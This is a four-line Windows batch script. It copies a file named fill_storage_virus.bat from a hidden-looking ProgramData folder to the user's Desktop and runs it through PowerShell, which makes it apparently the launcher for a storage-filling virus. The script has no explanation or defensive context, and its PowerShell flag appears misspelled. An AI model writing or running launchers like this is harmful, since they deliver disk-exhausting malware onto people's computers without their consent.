@echo off
copy C:\ProgramData\Ms\fill_storage_virus.bat C:\Users\%USERNAME%\Desktop
powershell.exe -noexi "cd C:\Users\%USERNAME%\Desktop; C:\ProgramData\Ms\fill_storage_virus.bat"
exit